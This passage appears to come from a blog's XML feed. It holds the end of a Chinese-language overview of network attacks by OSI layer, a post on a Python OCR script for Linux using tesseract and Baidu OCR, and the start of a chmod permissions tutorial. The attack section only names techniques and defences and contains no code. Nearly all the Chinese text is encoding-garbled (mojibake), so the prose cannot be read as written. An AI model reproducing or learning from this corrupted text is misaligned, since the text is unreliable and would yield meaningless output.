æœåŠ¡å™¨åœ¨DNSé€’å½’åç§°è§£æä¸­ï¼Œå½“æ‰€é…ç½®çš„æœ¬åœ°åç§°æœåŠ¡å™¨è§£æä¸äº†æ—¶ï¼Œåé¢çš„æŸ¥è¯¢å·¥ä½œæ˜¯ç”±æœ¬åœ°åç§°æœåŠ¡å™¨æ›¿ä»£DNSå®¢æˆ·ç«¯è¿›è¡Œçš„ï¼ˆä»¥â€œæœ¬åœ°åç§°æœåŠ¡å™¨â€ä¸ºä¸­å¿ƒï¼‰ï¼Œåªéœ€è¦æœ¬åœ°åç§°æœåŠ¡å™¨å‘DNSå®¢æˆ·ç«¯è¿”å›æœ€ç»ˆçš„æŸ¥è¯¢ç»“æœå³å¯ã€‚</code></pre><p>DNS è¿­ä»£æŸ¥è¯¢</p><pre><code>æ‰€æœ‰æŸ¥è¯¢å·¥ä½œå…¨éƒ¨æ˜¯DNSå®¢æˆ·ç«¯è‡ªå·±è¿›è¡Œï¼ˆä»¥â€œDNSå®¢æˆ·ç«¯â€è‡ªå·±ä¸ºä¸­å¿ƒï¼‰ã€‚</code></pre><ol type="1"><li><p>DNS åŠ«æŒ</p><ol type="1"><li><p>DNS ç¼“å­˜æ¯’åŒ–ï¼ˆDNS cache poisoningï¼‰</p></li><li><p>DNS ID æ¬ºéª—ï¼ˆDNS ID spoofingï¼‰</p></li></ol></li></ol><p>åŸºäº DNS çš„ DDos æ”»å‡»</p><h4 id="http">HTTP</h4><p>é’“é±¼æ”»å‡»</p><pre><code>HTTP åè®®æ²¡æœ‰è€ƒè™‘ç”¨æˆ·è®¤è¯è§£å†³ï¼šä½¿ç”¨ HTTPS</code></pre><ul class="task-list"><li><label><input type="checkbox" />XSS è·¨ç«™è„šæœ¬æ”»å‡»</label></li></ul><p>æœåŠ¡å™¨è¿‡æ»¤ä¸è¶³ï¼š</p><pre><code>åå°„æ€§å­˜å‚¨æ€§</code></pre><p>å®¢æˆ·ç«¯è„šæœ¬ï¼š</p><pre><code>DOM å‹</code></pre><h4 id="ç”µå­é‚®ä»¶">ç”µå­é‚®ä»¶</h4><p>ä¼ è¾“å®‰å…¨ï¼Œå­˜å‚¨å®‰å…¨ï¼Œå‘é€è€…èº«ä»½ç¡®è®¤å®‰å…¨ï¼Œé‚®ç®±è½°ç‚¸ã€‚</p><ul class="task-list"><li><label><input type="checkbox" />æµè§ˆå™¨è§£ææ ‡ç­¾çš„åŸç†</label></li></ul><h3 id="è¡¨ç¤ºå±‚">6. è¡¨ç¤ºå±‚</h3><h3 id="ä¼šè¯å±‚">5. ä¼šè¯å±‚</h3><h3 id="ä¼ è¾“å±‚">4. ä¼ è¾“å±‚</h3><h4 id="tcp-åè®®">TCP åè®®</h4><p>ç‰¹ç‚¹ï¼š å…¨åŒå·¥ï¼Œé¢å‘è¿æ¥ï¼Œå¯é æ€§ï¼Œé¢å‘å­—èŠ‚æµã€‚</p><ul class="task-list"><li><label><input type="checkbox" />è™šç”µè·¯</label></li></ul><ol type="1"><li><p>SYN flooding æ”»å‡» --&gt; æ‹’ç»æœåŠ¡æ”»å‡»</p><p>è§£å†³æ–¹æ³•ï¼š SYN cookie è§£å†³ â€œåŠè¿æ¥æ‹’ç»æœåŠ¡æ”»å‡»â€ï¼Œä½†æ˜¯å¯¹äº â€œå…¨è¿æ¥â€æ‹’ç»æœåŠ¡æ”»å‡»æ˜¯æ— æ•ˆçš„ã€‚</p></li><li><p>ACK flooding æ”»å‡»</p><p>æœåŠ¡å™¨æ”¶åˆ° ACK åŒ…åï¼Œéœ€è¦è¿›è¡ŒæŸ¥è¡¨ã€å›åº” ACKï¼ŒRSTã€‚ åˆ©ç”¨å¤§æµé‡ ACKå°åŒ…æ‰ä¼šå¯¹æœåŠ¡å™¨é€ æˆå½±å“ã€‚</p><p>ä¸€äº› TCP æœåŠ¡ä¼šå¯¹ ACK Folooding æ¯”è¾ƒæ•æ„Ÿã€‚</p><p>è§£å†³æ–¹æ³•ï¼š å¯¹ç§°å‹åˆ†æï¼š æ”¶åŒ…å¼‚å¸¸å¤§äºå‘åŒ…</p></li><li><p>åºåˆ—å·é¢„æµ‹æ”»å‡»</p><p>åœ¨ä¸€ä¸ª TCP è¿æ¥ä¸­ï¼Œ TCPç«¯å£å·å’Œåºåˆ—å·æ˜¯åˆ¤æ–­æ•°æ®åŒ…æ˜¯å¦ä¸ºæ‰€éœ€æ•°æ®åŒ…çš„ä¸»è¦ä¾æ®ã€‚ç”±äºä¸€æ—¦å»ºç«‹è¿æ¥ä¹‹åï¼Œç«¯å£å·æ˜¯ä¸å˜çš„ï¼Œå› æ­¤æ”»å‡»çš„éš¾ç‚¹å°±åœ¨äºåºåˆ—å·é¢„æµ‹ã€‚</p></li><li><p>LAND æ”»å‡»</p><p>LANDï¼ˆLocal Area Network Denialï¼‰ï¼Œæ”»å‡»è€…æ„é€ ä¸€ç§ç‰¹æ®Šçš„ TCP SYNæ”»å‡»åŒ…ï¼Œè¯¥åŒ…çš„ç›®çš„åœ°å€å’Œæºåœ°å€å‡ä¸ºç›®çš„ä¸»æœºï¼Œè¿™æ ·è¢«æ”»å‡»ä¸»æœºæœ‰å‘å›ç»™è‡ªå·±ACKæ¶ˆæ¯ï¼Œä¿æŒè¿æ¥ï¼Œç›´åˆ°è¶…æ—¶ï¼Œåˆ›å»ºä¸€ä¸ªç©ºè¿æ¥ï¼Œå¯¼è‡´ç›®çš„ä¸»æœºè¿ç»­åœ°è‡ªæˆ‘å“åº”ã€‚</p><p>æ–°ç³»ç»Ÿå·²ç»åŸºæœ¬æ¶ˆé™¤ã€‚</p></li></ol><h4 id="udp">UDP</h4><p>ç‰¹ç‚¹ï¼š æ— è¿æ¥ï¼Œä¸å¯é ï¼Œä¸ä¿åº</p><ol type="1"><li><p>UDP å‡å†’ ï¼ˆUDP spoofingï¼‰</p><p>æœ¬è´¨ä¸Šæ˜¯ IP å‡å†’æ”»å‡»ï¼Œå³: æ”»å‡»è€…å¯ä»¥æ„é€  UDPæ•°æ®åŒ…ï¼Œå…¶æºåœ°å€ä¸ºæŸä¸ªå¯ä¿¡èŠ‚ç‚¹çš„åœ°å€ã€‚</p></li><li><p>UDP åŠ«æŒï¼ˆUDP hijackï¼‰</p><p>å¯ä¿¡å®¢æˆ·ç«¯å‘èµ· UDP è¯·æ±‚åï¼Œæ”»å‡»è€…å‡å†’æœåŠ¡å™¨å‘å‡º UDP åº”ç­”ã€‚</p></li></ol><h3 id="ç½‘ç»œå±‚">3. ç½‘ç»œå±‚</h3><p>IP å±‚åè®®</p><p>IP å‡å†’æ”»å‡»(IP spoofing) åˆ©ç”¨è·¯ç”±å™¨åªæ ¹æ®ç›®çš„ IPæ¥ç¡®å®šåˆ†ç»„è½¬å‘åˆ°é‚£ä¸ªç«¯å£ï¼Œè€Œä¸å…³å¿ƒæº IP æ¥å®ç°ã€‚ IPå‡å†’æ”»å‡»ä¸»è¦ç”¨äºä¸¤ç§ç½‘ç»œæ”»å‡»ï¼š æ‹’ç»æœåŠ¡æ”»å‡»ä¸åŸºäº IPåœ°å€è®¤è¯çš„ç½‘ç»œæœåŠ¡ã€‚</p><p>è§£å†³ï¼š</p><ol type="1"><li>å…¥å£/å‡ºå£è¿‡æ»¤</li><li>IP å›æº¯æŠ€æœ¯</li></ol><h3 id="é“¾è·¯å±‚">2. é“¾è·¯å±‚</h3><p>ä»¥å¤ªç½‘åè®®</p><ol type="1"><li><p>äº¤æ¢æœºæ¯’åŒ– --&gt; çªƒå¬</p><p>äº¤æ¢æœºä¸é›†çº¿å™¨éƒ½æ˜¯è¿æ¥ç½‘ç»œèŠ‚ç‚¹ã€‚</p></li><li><p>arp æ¬ºéª—/æ¯’åŒ– --&gt; çªƒå¬ï¼Œä¸­é—´äººæ”»å‡»</p><p><ahref="https://www.jianshu.com/p/e7c02c841eaa">ç½‘ç»œé€‚é…å™¨ï¼ˆç½‘å¡ï¼‰</a>é’ˆå¯¹ç½‘å…³çš„æ”»å‡»</p><p>arp æ¬ºéª—å®ç°å½“ä¸»åŠ¡å™¨å¤±è´¥æ—¶ï¼Œç”¨æˆ·é€æ˜çš„åˆ‡æ¢è‡³å¤‡ä»½æœåŠ¡å™¨ã€‚</p></li></ol><h3 id="ç‰©ç†å±‚">1. ç‰©ç†å±‚</h3><p>é›†çº¿å™¨å·¥ä½œäº OSI/RM å‚è€ƒæ¨¡å‹çš„ç‰©ç†å±‚å’Œæ•°æ®é“¾è·¯å±‚çš„MACï¼ˆä»‹è´¨è®¿é—®æ§åˆ¶ï¼‰å­å±‚</p><p>é›†çº¿å™¨ --æ—©æœŸä½¿ç”¨å…¶é“¾æ¥ç½‘ç»œèŠ‚ç‚¹ï¼Œå› å…¶ä¸€ä¸ªèŠ‚ç‚¹å‘é€æ—¶ï¼Œå…¶ä½™èŠ‚ç‚¹åªèƒ½ç›‘å¬ï¼Œå¦åˆ™ä¼šäº§ç”Ÿå†²çªï¼Œå¯¼è‡´é‡ä¼ ï¼Œå› æ­¤ç›®å‰å¾ˆå°‘ä½¿ç”¨äº†å®ƒï¼Œå¤§éƒ½ç”¨äºŒå±‚äº¤æ¢æœºäº†ã€‚</p><ol type="1"><li>é›†çº¿å™¨çªƒå¬</li></ol>]]></content>
      
      
      <categories>
          
          <category> network </category>
          
      </categories>
      
      
        <tags>
            
            <tag> osi_sec </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux ä¸‹ä½¿ç”¨ Python OCR è¯†åˆ«</title>
      <link href="/blog/2020/07/13/utilities/pylinux_ocr/"/>
      <url>/blog/2020/07/13/utilities/pylinux_ocr/</url>
      
        <content type="html"><![CDATA[<h2 id="preparation">Preparation</h2><h3 id="notice">Notice</h3><blockquote><p>manjaro kde ç”¨æˆ·ç›´æ¥çœ‹ä¸‹é¢çš„å®‰è£…æ€»ç»“ï¼Œä¸€æŠŠæ¢­å“ˆã€‚</p></blockquote><h3 id="screenshot-tools">screenshot tools</h3><p>Spectacle ä¸º KDEæ¡Œé¢è‡ªå¸¦çš„å®˜æ–¹å±å¹•æˆªå›¾å·¥å…·ï¼ŒåŠŸèƒ½å¼ºå¤§ï¼Œä½¿ç”¨èˆ’é€‚ï¼Œæ¨èä½¿ç”¨å“¦ã€‚ æœ¬æ¥æƒ³é€šè¿‡flameshotçš„å‘½ä»¤è¡Œæ¥å®ç°æˆªå›¾å¹¶å­˜å‚¨åˆ°æŒ‡å®šä½ç½®çš„ï¼Œç„¶è€Œå®ƒçš„å‘½ä»¤è¡Œä¸èƒ½å¤Ÿæˆªå–éƒ¨åˆ†åŒºåŸŸï¼Œåªèƒ½æˆªå–æ•´ä¸ªæ¡Œé¢æˆ–è€…å±å¹•ã€‚</p><p>æˆ‘çŸ¥é“çš„å…¶ä»–å¯ä»¥ä½¿ç”¨æˆªå›¾å·¥å…·çš„æœ‰ï¼š scotã€gnome-screenshot</p><p>å‚è€ƒå‘½ä»¤(æˆªå–æŒ‡å®šçŸ©å½¢ï¼Œå¹¶å­˜å‚¨åˆ°æŒ‡å®šä½ç½®):</p><p><code>scrot -s -o ~/Documents/temp.png</code>ã€<code>gnome-screenshot -a -f ~/Documents/temp.png</code></p><p>æ³¨ï¼šä¸ªäººè®¤ä¸º spectacle æ¯” scrot æˆªå›¾å¯è§†åŒ–åšå¾—å¥½ï¼Œå³ï¼šæˆªå–åŒºåŸŸæ—¶ï¼Œå¯ä»¥æ˜æ˜¾çœ‹è§ï¼Œè€Œä¸”æˆªå–å®Œäº†ï¼Œå¯ä»¥å†æ”¹å˜æˆ–è€…ä¸ç§»åŠ¨åŒºåŸŸã€‚</p><h3 id="tesseract-ocr">tesseract-ocr</h3><h3 id="introduction">Introduction</h3><p>tesseract æ˜¯ä¸€æ¬¾è¢«å¹¿æ³›ä½¿ç”¨çš„å¼€æº OCR å·¥å…·ï¼Œåœ¨ç°åœ¨çš„å…è´¹ OCRå¼•æ“ä¸­ï¼Œå…¶è¯†åˆ«ç²¾åº¦ç±»è¾ƒå¥½çš„ï¼Œä¹Ÿå¹¿æ³›è¢«ä½¿ç”¨ã€‚tesseract ä½œä¸ºå¼€æºé¡¹ç›®å‘å¸ƒåœ¨GitHub ä¸Šï¼Œå…¶æœ€æ–°ç‰ˆæœ¬å·²ç»æ”¯æŒä¸­æ–‡ OCRï¼Œå¹¶æä¾›äº†å‘½ä»¤è¡Œå·¥å…·ï¼Œæ­¤å¤–ï¼Œè¿˜æœ‰Python åº“ <code>pytesseract</code>ã€‚</p><p><a href="https://github.com/tesseract-ocr/tesseract">tesseractGithub</a></p><h4 id="installation">Installation</h4><p>å„å‘è¡Œç‰ˆ Linux ä¸€èˆ¬å¯¹åº”ä»“åº“éƒ½æœ‰åŒ…ï¼Œæˆ‘ä½¿ç”¨çš„æ˜¯Manjaroï¼Œå¾—ç›Šäºå…¶å¼ºå¤§çš„ç¤¾åŒºä»¥åŠç”¨æˆ·ä»“åº“ï¼Œå®‰è£…è½¯ä»¶ä¸€å¥å‘½ä»¤è¡Œæå®šã€‚</p><ol type="1"><li><p>å®‰è£… Tesseract <code>sudo pacman -S tesseract</code></p></li><li><p>å®‰è£…è¯­è¨€æ–‡ä»¶</p><ol type="1"><li><p>æ–¹æ³•ä¸€ï¼š<code>sudo pacman -S tesseract-data-chi_sim tesseract-data-eng</code></p></li><li><p>æ–¹æ³•äºŒï¼š ç›´æ¥åœ¨ <ahref="https://github.com/tesseract-ocr/tessdata">Github tessdata</a>ä¸‹è½½ï¼Œç„¶åå°†å…¶ç§»åŠ¨åˆ° tessdata å¯¹åº”ä½ç½®å³å¯ã€‚ manjaro linux çš„ä½ç½®æ˜¯<code>/usr/share/tessdata/</code>ï¼Œ å…¶ä»– Debian based Linux å¯èƒ½æ˜¯<code>/usr/share/tesseract-ocr/tessdata</code>ã€‚</p></li></ol></li><li><p>æ£€æŸ¥æ˜¯å¦å®‰è£…å¥½</p></li></ol><p>è¯¥å‘½ä»¤æ˜¾ç¤ºå‡ºå®‰è£…è¿‡çš„è¯­è¨€æ•°æ®åŒ…ï¼ˆæˆ‘å¤šå®‰è£…äº†ä¸¤ä¸ªï¼‰ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">tesseract --list-langs</span></span><br><span class="line">List of available languages (4):</span><br><span class="line">chi_sim</span><br><span class="line">chi_sim_vert</span><br><span class="line">eng</span><br><span class="line">osd</span><br></pre></td></tr></table></figure><h3 id="baidu-ocr">Baidu OCR</h3><h4 id="introduction-1">Introduction</h4><p>æˆ‘ä½¿ç”¨çš„æ˜¯ç™¾åº¦ OCR çš„ SDKï¼ˆä¸ºå•¥æ²¡ç›´æ¥ APIï¼Œé¢ï¼Œç¬¬ä¸€çœ¼çœ‹åˆ°äº†SDKï¼Œå°±ç”¨äº† emmï¼‰ã€‚åé¢æ‰å‘ç° SDKä¸å¤ªé€‚åˆå¯¹å«ä½ç½®ä¿¡æ¯ç‰ˆçš„æ¥å£è¿›è¡ŒäºŒæ¬¡å¤„ç†ï¼Œæ‰©å±•åŠŸèƒ½ï¼Œç­‰æœ‰ç©ºå†æå§ã€‚</p><h4 id="installation-1">Installation</h4><ol type="1"><li><code>pip install baidu-aip</code></li><li>ç”³è¯· API æ¥å£ åé¢å¡«åˆ°è„šæœ¬å¯¹åº”ä½ç½®ã€‚ ç”³è¯·æ•™ç¨‹å‚è€ƒï¼š<ahref="https://blog.csdn.net/biao197/article/details/102907492">å¦‚ä½•ç”³è¯·ç™¾åº¦æ–‡å­—è¯†åˆ«apikey å’Œ Secret Key</a></li></ol><h3 id="å…¶ä»–-python-ç¬¬ä¸‰æ–¹åº“">å…¶ä»– Python ç¬¬ä¸‰æ–¹åº“</h3><ol type="1"><li><p>pytesseract è°ƒç”¨ tesseractï¼š<code>pip install pytesseract</code></p></li><li><p>pyperclip å¤„ç†å‰ªåˆ‡æ¿ä¸­çº¯æ–‡æœ¬ä¸ Python çš„äº¤äº’ï¼š<code>pip install pyperclip</code> ä¾èµ– <code>xclip</code> æˆ–è€…<code>xsel</code>ï¼Œ å®‰è£…å‘½ä»¤ï¼š<code>sudo pacman -S xclip</code></p></li></ol><p>pillow å¤„ç†å›¾ç‰‡ï¼š <code>pip install pillow</code></p><h3 id="å®‰è£…æ€»ç»“">å®‰è£…æ€»ç»“</h3><ol type="1"><li><p>å®‰è£…</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S xclip tesseract tesseract-data-chi_sim tesseract-data-eng</span><br><span class="line">pip install baidu-aip pytesseract pyperclip</span><br></pre></td></tr></table></figure></p></li><li><p>å»ç™¾åº¦æ™ºèƒ½äº‘åˆ›å»ºæ–‡å­—è¯†åˆ«åº”ç”¨ï¼Œå¹¶è·å–è¯¥åº”ç”¨ä¸‰ä¸ªä¿¡æ¯ è¯¦ç»†æ­¥éª¤è§ <ahref="https://blog.csdn.net/biao197/article/details/102907492">å¦‚ä½•ç”³è¯·ç™¾åº¦æ–‡å­—è¯†åˆ«apikey å’Œ Secret Key</a><code>APP_IDã€API_KEYã€SECRET_KEY</code></p></li></ol><h2 id="è„šæœ¬ç¼–å†™">è„šæœ¬ç¼–å†™</h2><h3 id="è„šæœ¬æ€è·¯">è„šæœ¬æ€è·¯</h3><ol type="1"><li><p>åˆ©ç”¨æˆªå›¾è½¯ä»¶ spectacle æˆªå–éœ€è¦è¢«æ–‡å­—è¯†åˆ«çš„éƒ¨åˆ†ï¼›</p></li><li><p>åˆ©ç”¨ç™¾åº¦ OCR æˆ–è€…æ–‡å­—è¯†åˆ« OCR è½¯ä»¶ tesseract è¿›è¡Œè¯†åˆ«å‚æ•°æ§åˆ¶æœ‰æ— ç½‘ç»œï¼Œä½¿å¾—æœ‰ç½‘ç»œç”¨ç™¾åº¦ï¼Œ æ— ç½‘ç»œç”¨ tesseract</p></li><li><p>å°†ç»“æœè¾“å‡ºè‡³å‰ªåˆ‡æ¿å‚æ•°æ§åˆ¶æ˜¯å¦éœ€è¦æ®µè½æ•´ç†ï¼ˆåœ¨ä½ è¯†åˆ«æ®µè½æ–‡å­—æ—¶ï¼Œå¾ˆé‡è¦ï¼Œä¸å¤„ç†çš„è¯ï¼Œæ¢è¡Œä¹‹ç±»çš„æ ¼å¼è¾ƒä¹±ï¼‰ï¼Œé€šè¿‡æ­£åˆ™è¿›è¡Œæ®µè½æ•´ç†ã€‚</p></li></ol><h3 id="å­¦ä¹ å†ç¨‹">å­¦ä¹ å†ç¨‹</h3><ol start="0" type="1"><li><p>æŸ¥é˜…å­¦ä¹  spectacle <code>spectacle --help</code></p></li><li><p>æŸ¥é˜…å­¦ä¹  tesseract åŸºæœ¬å‘½ä»¤ï¼›<code>tesseract --help-extra</code></p></li><li><p>æŸ¥é˜…å­¦ä¹  ç™¾åº¦ OCR SDK æ–‡æ¡£ï¼Œå¹¶å­¦ä¹  baidu-aip æ¨¡å—åŸºæœ¬ä½¿ç”¨ <ahref="https://cloud.baidu.com/doc/OCR/s/Ek3h7yeiq">baidu OCR SDK Pythonæ–‡æ¡£</a></p></li><li><p>å­¦ä¹  pytesseractã€pyperclipã€pillow æ¨¡å—åŸºæœ¬ä½¿ç”¨</p></li><li><p>å­¦ä¹  Python è°ƒç”¨ shell å‘½ä»¤</p></li></ol><h2 id="python-ä»£ç ">Python ä»£ç </h2><p><ahref="https://github.com/violetu/mybackup/blob/master/useful_scripts/spectacle_ocr.py">è„šæœ¬spectacle_ocr.py</a></p><p>æ³¨æ„ï¼š</p><ol type="1"><li>å°†ä¸´æ—¶è·¯å¾„ TEMP_IMG_PATH è‡ªå·±è®¾ç½®ä¸€ä¸ªã€‚</li><li>åœ¨è„šæœ¬ä¸­æœç´¢ "Notice"ï¼Œæ‰¾åˆ°ç™¾åº¦ APIä¿¡æ¯çš„ä½ç½®ï¼Œè¡¥å……ä¹‹å‰ä½ åˆ›å»ºçš„ç™¾åº¦æ–‡å­—è¯†åˆ«åº”ç”¨çš„ä¿¡æ¯ï¼š<code>APP_IDã€API_KEYã€SECRET_KEY</code></li></ol><h2 id="å¿«æ·é”®è®¾ç½®">å¿«æ·é”®è®¾ç½®</h2><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200711205058.png"alt="å¿«æ·é”®è®¾ç½®" /><figcaption aria-hidden="true">å¿«æ·é”®è®¾ç½®</figcaption></figure><h2 id="é—®é¢˜ä¸æ”¹è¿›">é—®é¢˜ä¸æ”¹è¿›</h2><h3 id="æˆªå›¾å›¾ç‰‡ä½œä¸ºä¸­é—´äº§ç‰©">æˆªå›¾å›¾ç‰‡ä½œä¸ºä¸­é—´äº§ç‰©</h3><p>æœ¬è„šæœ¬ä½¿ç”¨äº†å¤–éƒ¨æˆªå›¾å·¥å…·æˆªå›¾åæ”¾åˆ°æŒ‡å®šä½ç½®ï¼Œç„¶åä»è¯¥ä½ç½®è·å–å›¾ç‰‡ï¼Œè¿™æ ·å­˜å‚¨è¯»å–é€Ÿåº¦å°±æ…¢äº†äº›ï¼Œè€Œä¸”äº§ç”Ÿäº†ä¸­é—´äº§ç‰©ï¼šä¸€å¼ æˆªå›¾ã€‚</p><p>æˆ‘å°è¯•è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå‘ç°å¸¸ç”¨çš„æ–¹æ³•æœ‰ä¸¤ç§ï¼š</p><ol type="1"><li><p>ä½¿ç”¨ pillow æ¨¡å—çš„ <code>ImageGrab.grabclipboard()</code>è·å–å‰ªåˆ‡æ¿çš„æˆªå›¾</p><p>ä»ä¸‹é¢é“¾æ¥å¯ä»¥çœ‹å‡ºï¼Œè¯¥æ–¹æ³•åªæ˜¯ç”¨äº Windows å’Œ OS Xã€‚ <ahref="https://pillow.readthedocs.io/en/3.1.x/reference/ImageGrab.html">ImageGrabModule (OS X and Windows only)</a></p><p>å› æ­¤ï¼Œæˆ‘å°è¯•æœç´¢ â€ImageGrab Linux alternativeâ€œ æ‰¾åˆ°äº† <ahref="https://stackoverflow.com/questions/43520757/imagegrab-alternative-in-linux">ImageGrabalternative in linux</a>ï¼Œä¹Ÿå°±æ˜¯ï¼š pyscreenshot</p><p>ç„¶è€Œï¼Œ pyscreenshot å¹¶æ²¡æœ‰ grabclipboardæ–¹æ³•ï¼Œç›´æ¥è·å–å‰ªåˆ‡æ¿å›¾ç‰‡ï¼Œè€Œæ˜¯å¯ä»¥ç›´æ¥æˆªå›¾ï¼Œè¿™å°±å¾ˆé«˜çº§äº†ã€‚é€šè¿‡æ­é…python çš„ <code>pynput</code>åº“æ¥ç›‘å¬é”®ç›˜å®ç°å¿«æ·é”®æˆªå›¾ï¼Œç›‘å¬é¼ æ ‡ç¡®å®šæˆªå›¾åŒºåŸŸã€‚</p><p>è¿™æ ·ï¼Œå°±ç›´æ¥é¿å…äº†ä½¿ç”¨æˆªå›¾å·¥å…·å’Œäº§ç”Ÿä¸­é—´å›¾ç‰‡çš„é—®é¢˜ï¼ŒGreatï¼</p><ul class="task-list"><li><label><input type="checkbox" />å¾…æ”¹è¿›</label></li></ul></li><li><p>ä½¿ç”¨ Qt æˆ–è€… GTK å›¾å½¢ç•Œé¢æ¡†æ¶æ¥è¿›è¡Œæˆªå›¾ä¸è·å–æˆªå›¾åçš„å›¾ç‰‡è‡³Python å¯¹è±¡ã€‚</p><p>è¿™å½“ç„¶é€‰ Qt äº†ï¼Œä¸€æ–¹é¢å­¦è¿‡ Qt çš„ä¸€äº›çŸ¥è¯†ï¼Œä¸€æ–¹é¢æˆ‘ç”¨çš„ KDE æ¡Œé¢æ˜¯ä½¿ç”¨Qt å¼€å‘ã€‚</p><ul class="task-list"><li><label><input type="checkbox" />å›¾å½¢ç•Œé¢çš„ OCR è¯†åˆ«</label></li></ul></li></ol><h2 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h2><blockquote><ol type="1"><li><ahref="https://stackoverflow.com/questions/51668339/preserving-spaces-in-tesseract">PreservingSpaces in Tesseract</a></li><li><a href="https://pypi.org/project/pytesseract/">pypi pytesseract0.3.4</a></li><li><a href="https://ptorch.com/news/231.html">pypi pytesseract 0.3.4ä¸­æ–‡ç¿»è¯‘</a></li><li><a href="https://stackoverflow.com/questions/4909396/">Is there anyway to improve tesseract OCR with small fonts?</a></li><li><a href="https://ai.baidu.com/ai-doc/OCR/3k3h7yeqa">baidu æ–‡å­—è¯†åˆ«SDK python æ¥å£è¯´æ˜</a></li><li><ahref="https://blog.csdn.net/XnCSD/article/details/80786793">Pythonåˆ©ç”¨ç™¾åº¦æ–‡å­—è¯†åˆ« API è¯†åˆ«å¹¶æå–å›¾ç‰‡ä¸­æ–‡å­—</a></li><li><a href="https://github.com/asweigart/pyperclip">pyperclipgithub</a></li><li><a href="https://www.jianshu.com/p/a793c0d960fe">pythonå‘½åè§„èŒƒ</a></li><li><a href="https://www.zhihu.com/question/26232941">ä½¿ç”¨ OCR è¯†åˆ«æ‰«æPDF åçš„å¤šä½™å›è½¦åº”è¯¥å¦‚ä½•å»é™¤ï¼Ÿ</a></li><li><a href="https://www.pythonf.cn/read/124275">Python å±å¹•æ•è·+OCRè¯†åˆ«+ç¿»è¯‘,python,æˆªå±,ocr</a></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> utilities </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> Tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>chmodï¼ˆFile Permissionsï¼‰</title>
      <link href="/blog/2020/07/13/linux/tools/chmod/"/>
      <url>/blog/2020/07/13/linux/tools/chmod/</url>
      
        <content type="html"><![CDATA[<h2 id="linux-file-permissions">Linux File Permissions</h2><p>ç±» unix ç³»ç»Ÿä¸Šçš„æ‰€æœ‰æ–‡ä»¶ç³»ç»Ÿå¯¹è±¡éƒ½æœ‰ä¸‰ç§ä¸»è¦çš„æƒé™ç±»å‹:readã€write å’Œexecute æƒé™ã€‚è¿™äº›æƒé™è¢«èµ‹äºˆç»™ä¸‰ç±»ç”¨æˆ·ï¼šthe user(the file owner), thegroup, and the others.</p><p>è¦æŸ¥çœ‹æ–‡ä»¶æƒé™ï¼Œå¯ä»¥ä½¿ç”¨ <code>ls</code> çš„<code>-l</code> (longformat) é€‰é¡¹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ls</span> -l</span></span><br><span class="line">total 12K</span><br><span class="line">-rw-r--r-- 2 violetv violetv  426  6æœˆ 14 16:40 batch.py</span><br><span class="line">-rw-r--r-- 2 violetv violetv  426  6æœˆ 14 16:40 hard_link_batch.py</span><br><span class="line">lrwxrwxrwx 1 violetv violetv    8  6æœˆ 29 10:02 soft_link_batch.py -&gt; batch.py</span><br><span class="line">drwxr-xr-x 2 violetv violetv 4.0K  6æœˆ 13 14:37 test1</span><br></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">-rw-r--r-- 12 linuxize users 12.0K Apr  8 20:51 filename.txt</span><br><span class="line">|[-][-][-]-   [------] [---]</span><br><span class="line">| |  |  | |      |       |</span><br><span class="line">| |  |  | |      |       +-----------&gt; 7. Group</span><br><span class="line">| |  |  | |      +-------------------&gt; 6. Owner</span><br><span class="line">| |  |  | +--------------------------&gt; 5. Alternate Access Method</span><br><span class="line">| |  |  +----------------------------&gt; 4. Others Permissions</span><br><span class="line">| |  +-------------------------------&gt; 3. Group Permissions</span><br><span class="line">| +----------------------------------&gt; 2. Owner Permissions</span><br><span class="line">+------------------------------------&gt; 1. File Type</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ä¸»è¦ç ”ç©¶æ¯ä¸€è¡Œçš„ç¬¬ä¸€éƒ¨åˆ†ï¼Œç¬¬ä¸€éƒ¨åˆ†æœ‰ 9 ä¸ªå­—ç¬¦ï¼ŒæŒ‰ç…§ 1ï¼Œ3ï¼Œ3ï¼Œ3åˆ†åˆ«å››ä¸ªéƒ¨åˆ†ï¼Œå…¶å«ä¹‰å¦‚ä¸‹ï¼š</p><table><thead><tr class="header"><th style="text-align: left;">File type</th><th style="text-align: left;">User</th><th style="text-align: left;">Group</th><th style="text-align: left;">Others</th></tr></thead><tbody><tr class="odd"><td style="text-align: left;"><code>d</code> Directory</td><td style="text-align: left;"><code>rwx</code></td><td style="text-align: left;"><code>r-x</code></td><td style="text-align: left;"><code>r-x</code></td></tr><tr class="even"><td style="text-align: left;"><code>-</code> Regular file</td><td style="text-align: left;"><code>rw-</code></td><td style="text-align: left;"><code>r--</code></td><td style="text-align: left;"><code>r--</code></td></tr><tr class="odd"><td style="text-align: left;"><code>l</code> Symbolic Link</td><td style="text-align: left;"><code>rwx</code></td><td style="text-align: left;"><code>rwx</code></td><td style="text-align: left;"><code>rwx</code></td></tr></tbody></table><ol 